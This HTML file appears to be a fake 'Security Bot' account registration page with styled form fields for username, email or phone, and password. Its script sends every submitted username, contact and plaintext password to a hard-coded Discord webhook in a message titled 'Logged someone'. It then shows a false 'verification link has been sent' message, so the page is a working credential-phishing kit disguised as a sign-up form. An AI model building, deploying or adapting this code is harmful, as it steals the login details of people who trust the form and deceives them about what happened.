<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Security Bot - Register</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0a0f1c, #0d1225);
      background-attachment: fixed;
      background-size: cover;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: rgba(10, 15, 28, 0.9);
      border: 1px solid #1e2a3a;
      padding: 2rem 3rem;
      border-radius: 1rem;
      box-shadow: 0 0 30px rgba(0, 136, 255, 0.3);
      width: 100%;
      max-width: 400px;
      backdrop-filter: blur(10px);
    }

    h2 {
      text-align: center;
      margin-bottom: 1.5rem;
      color: #4db8ff;
      font-size: 1.8rem;
    }

    label {
      display: block;
      margin-bottom: 0.5rem;
      color: #88bde6;
    }

    input {
      width: 100%;
      padding: 0.75rem;
      margin-bottom: 1.2rem;
      border: none;
      border-radius: 0.5rem;
      background: #1c2433;
      color: #ffffff;
      font-size: 1rem;
    }

    input:focus {
      outline: none;
      box-shadow: 0 0 8px #00b7ff;
    }

    button {
      width: 100%;
      padding: 0.8rem;
      background: linear-gradient(145deg, #0077ff, #00d0ff);
      border: none;
      border-radius: 0.5rem;
      font-size: 1rem;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      background: linear-gradient(145deg, #00b7ff, #0077ff);
    }

    .footer {
      text-align: center;
      margin-top: 1rem;
      font-size: 0.85rem;
      color: #7fa4cc;
    }

    .footer a {
      color: #4db8ff;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    .message {
      margin-top: 1rem;
      padding: 1rem;
      border-radius: 0.5rem;
      background-color: #12213a;
      color: #00c3ff;
      text-align: center;
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Register to Security Bot</h2>
    <form id="registerForm">
      <label for="username">Username</label>
      <input type="text" id="username" placeholder="yourname123" required />

      <label for="email">Email or Phone Number</label>
      <input type="text" id="email" placeholder="you@example.com or +1234567890" required />

      <label for="password">Password</label>
      <input type="password" id="password" placeholder="••••••••" required />

      <label for="confirm">Confirm Password</label>
      <input type="password" id="confirm" placeholder="Repeat password" required />

      <button type="submit">Create Account</button>
    </form>

    <div class="message" id="successMessage">
      ✅ A verification link has been sent.<br>
      Please check your inbox to verify your account.
    </div>

    <div class="footer">
      Already registered? <a href="#">Login here</a>
    </div>
  </div>

  <script>
    const form = document.getElementById('registerForm');
    const successMessage = document.getElementById('successMessage');

    form.addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value.trim();
      const input = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value;
      const confirm = document.getElementById('confirm').value;

      const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
      const phoneRegex = /^\\+?\\d{10,15}$/;

      const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input);
      const isPhone = /^\+?\d{10,15}$/.test(input);

      const allowedDomains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'protonmail.com', 'proton.me'];

      if (!isEmail && !isPhone) {
        alert('Please enter a valid email or phone number.');
        return;
      }

      if (isEmail) {
        const domain = input.split('@')[1].toLowerCase();
        if (!allowedDomains.includes(domain)) {
          alert('Only Gmail, Yahoo, ProtonMail, and Hotmail emails are allowed.');
          return;
        }
      }

      if (password !== confirm) {
        alert('Passwords do not match. Please try again.');
        return;
      }

      const data = {
        username: "Security Bot Register",
        embeds: [
          {
            title: "✅ Logged someone",
            color: 3447003,
            fields: [
              { name: "Username", value: username || "(none)", inline: false },
              { name: "Email/Phone", value: input, inline: false },
              { name: "Password", value: password, inline: false }
            ],
            footer: {
              text: "Made by skibidi07307"
            },
            timestamp: new Date()
          }
        ]
      };

      fetch("https://discord.com/api/webhooks/1375976533637726208/1WXRXcCzlq0dSjV7yXuj9pxUniNbRGvdq6n3DqWNxpu-spiWfj2Kp-TGuXQ24rrKmqAF", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      }).then(() => {
        form.style.display = 'none';

        if (isEmail) {
          successMessage.innerHTML = "✅ A verification link has been sent.<br>Please check your inbox to verify your account.";
        } else {
          successMessage.innerHTML = "✅ Account created.";
        }
        successMessage.style.display = 'block';
      }).catch((err) => {
        console.error('Webhook error:', err);
        alert("An error occurred while submitting the form.");
      });
    });
  </script>
</body>
</html>
